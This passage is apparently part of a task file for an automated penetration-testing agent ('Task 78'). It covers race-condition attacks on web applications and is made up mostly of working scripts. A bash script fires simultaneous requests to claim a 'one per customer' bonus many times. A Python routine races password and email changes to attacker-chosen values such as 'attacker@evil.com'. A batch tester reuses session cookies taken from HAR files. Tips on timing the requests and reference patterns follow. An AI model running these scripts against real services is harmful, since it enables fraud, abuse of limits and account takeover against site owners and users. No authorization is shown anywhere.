        print(f"[!] RATE LIMIT BYPASS: {passed} requests passed!")
        return True
    
    return False

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.2 Quantity Limit Bypass
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# race_quantity_limit.sh

# Attack: Bypass "1 per customer" limits
# Example: Free trial, promo items, signup bonuses

CLAIM_URL="https://target.com/api/claim-bonus"
AUTH_COOKIE="session=YOUR_SESSION"

echo "[*] Racing to claim bonus multiple times..."

# Send 20 simultaneous claims
for i in $(seq 1 20); do
    curl -sk "$CLAIM_URL" \
        -H "Cookie: $AUTH_COOKIE" \
        -d "claim=true" \
        -o "temp/agent1/race/claim_$i.txt" &
done

wait

# Count successes
successes=$(grep -l "success" temp/agent1/race/claim_*.txt 2>/dev/null | wc -l)
echo "[*] Successful claims: $successes"

if [ "$successes" -gt 1 ]; then
    echo "[!] QUANTITY LIMIT BYPASS: Claimed $successes times!"
fi

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.3 Concurrent Session Abuse
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# race_session.py

"""
Exploit lack of session locking

Attack: Use same session from multiple devices/threads
to perform operations that should be mutually exclusive
"""

def race_session_operations(base_url, session_cookie, operations):
    """
    Perform multiple operations on same session simultaneously
    
    operations: List of (endpoint, data) tuples
    """
    
    results = []
    barrier = threading.Barrier(len(operations))
    
    def do_operation(endpoint, data, results, barrier):
        barrier.wait()
        try:
            resp = requests.post(
                f"{base_url}{endpoint}",
                data=data,
                cookies={'session': session_cookie},
                verify=False,
                timeout=30
            )
            results.append({
                'endpoint': endpoint,
                'status': resp.status_code,
                'response': resp.text[:300]
            })
        except Exception as e:
            results.append({'endpoint': endpoint, 'error': str(e)})
    
    with ThreadPoolExecutor(max_workers=len(operations)) as executor:
        futures = [
            executor.submit(do_operation, ep, data, results, barrier)
            for ep, data in operations
        ]
        
        for f in futures:
            f.result()
    
    return results

# Example: Race password change vs session invalidation
operations = [
    ('/api/change-password', {'new_password': 'attacker123'}),
    ('/api/change-password', {'new_password': 'attacker456'}),
    ('/api/logout', {}),
    ('/api/change-email', {'email': 'attacker@evil.com'}),
]

================================================================================
PHASE 5: AUTOMATED RACE TESTING
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
5.1 Batch Race Tester
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# batch_race_test.py

import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import json
import os

class BatchRaceTester:
    def __init__(self, auth_cookies=None, auth_headers=None):
        self.auth_cookies = auth_cookies or {}
        self.auth_headers = auth_headers or {}
        self.confirmed_races = []
    
    def test_endpoint(self, url, method='POST', data=None, num_requests=10):
        """Test single endpoint for race conditions"""
        
        results = []
        barrier = threading.Barrier(num_requests)
        
        def make_request(results, barrier):
            barrier.wait()
            session = requests.Session()
            session.verify = False
            
            try:
                if method == 'POST':
                    resp = session.post(
                        url,
                        data=data,
                        cookies=self.auth_cookies,
                        headers=self.auth_headers,
                        timeout=30
                    )
                else:
                    resp = session.get(
                        url,
                        cookies=self.auth_cookies,
                        headers=self.auth_headers,
                        timeout=30
                    )
                
                results.append({
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'body_hash': hash(resp.text[:100])
                })
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=num_requests) as executor:
            futures = [
                executor.submit(make_request, results, barrier)
                for _ in range(num_requests)
            ]
            for f in futures:
                f.result()
        
        # Analyze for race condition indicators
        successes = [r for r in results if r.get('status') == 200]
        unique_responses = len(set(r.get('body_hash') for r in results))
        
        is_vulnerable = len(successes) > 1 and unique_responses < len(successes)
        
        if is_vulnerable:
            self.confirmed_races.append({
                'url': url,
                'method': method,
                'successes': len(successes),
                'unique_responses': unique_responses
            })
        
        return is_vulnerable, results
    
    def test_batch(self, endpoints_file):
        """Test all endpoints from file"""
        
        with open(endpoints_file) as f:
            for line in f:
                parts = line.strip().split('|')
                url = parts[0]
                
                if not url:
                    continue
                
                print(f"[*] Testing: {url}")
                vulnerable, _ = self.test_endpoint(url, num_requests=10)
                
                if vulnerable:
                    print(f"  [!] RACE CONDITION FOUND!")
        
        return self.confirmed_races
    
    def save_results(self, output_file):
        """Save confirmed race conditions"""
        with open(output_file, 'w') as f:
            for race in self.confirmed_races:
                f.write(f"{race['url']}|successes:{race['successes']}|unique:{race['unique_responses']}\n")

# Main
if __name__ == "__main__":
    # Load auth from HAR analysis
    auth_cookies = {}
    auth_headers = {}
    
    # Try to load from HAR auth files
    har_auth_files = [f for f in os.listdir('outputs/har/accounts/') if f.endswith('_auth.json')]
    if har_auth_files:
        with open(f'outputs/har/accounts/{har_auth_files[0]}') as f:
            auth_data = json.load(f)
            auth_cookies = auth_data.get('cookies', {})
            auth_headers = auth_data.get('headers', {})
    
    tester = BatchRaceTester(auth_cookies, auth_headers)
    results = tester.test_batch('outputs/race/race_prone_endpoints.txt')
    tester.save_results('outputs/race/race_confirmed.txt')
    
    print(f"\n[*] Found {len(results)} race conditions")

================================================================================
PHASE 6: DOCUMENT RESULTS
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
6.1 Consolidate Race Findings
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# consolidate_race.sh

echo "# Race Condition Results" > outputs/race/race_exploitation_log.txt
echo "# Generated: $(date)" >> outputs/race/race_exploitation_log.txt
echo "" >> outputs/race/race_exploitation_log.txt

echo "## Confirmed Race Conditions" >> outputs/race/race_exploitation_log.txt
cat outputs/race/race_confirmed.txt 2>/dev/null >> outputs/race/race_exploitation_log.txt

echo "" >> outputs/race/race_exploitation_log.txt
echo "## TOCTOU Results" >> outputs/race/race_exploitation_log.txt
cat outputs/race/toctou_results.txt 2>/dev/null >> outputs/race/race_exploitation_log.txt

echo "" >> outputs/race/race_exploitation_log.txt
echo "## Limit Bypass Results" >> outputs/race/race_exploitation_log.txt
cat outputs/race/limit_bypass_results.txt 2>/dev/null >> outputs/race/race_exploitation_log.txt

================================================================================
SUMMARY & STATISTICS
================================================================================

echo ""
echo "=========================================="
echo "TASK 78 SUMMARY - Race Conditions"
echo "=========================================="
echo "Endpoints tested:        $(wc -l < outputs/race/race_prone_endpoints.txt 2>/dev/null || echo 0)"
echo "Race conditions found:   $(wc -l < outputs/race/race_confirmed.txt 2>/dev/null || echo 0)"
echo "TOCTOU exploits:         $(wc -l < outputs/race/toctou_results.txt 2>/dev/null || echo 0)"
echo "Limit bypasses:          $(wc -l < outputs/race/limit_bypass_results.txt 2>/dev/null || echo 0)"

================================================================================
‚ö†Ô∏è COMMON MISTAKES TO AVOID ‚ö†Ô∏è
================================================================================

‚ùå Using slow sequential requests
   ‚Üí Must be SIMULTANEOUS (barrier sync or single-packet)

‚ùå Not enough concurrent requests
   ‚Üí Start with 10-20, increase if needed

‚ùå Testing on non-state-changing endpoints
   ‚Üí Focus on financial, limit, one-time operations

‚ùå Not checking actual state after race
   ‚Üí Verify balance/inventory/count changed incorrectly

‚ùå Ignoring HTTP/2 single-packet technique
   ‚Üí Most reliable method for precise timing

================================================================================
üìö REFERENCE: RACE CONDITION PATTERNS
================================================================================

TOCTOU Pattern:
  if (check_condition()) {    ‚Üê Race window opens
      do_operation();         ‚Üê Both requests reach here
      update_state();         ‚Üê Only one update happens
  }

Double-Spend Pattern:
  balance = get_balance();    ‚Üê Both see same balance
  if (balance >= amount) {
      process_payment();
      set_balance(balance - amount);  ‚Üê Second write overwrites first
  }

Limit Bypass Pattern:
  count = get_usage_count();  ‚Üê Both see count < limit
  if (count < limit) {
      do_action();
      increment_count();      ‚Üê Both increment, ending at limit+1
  }
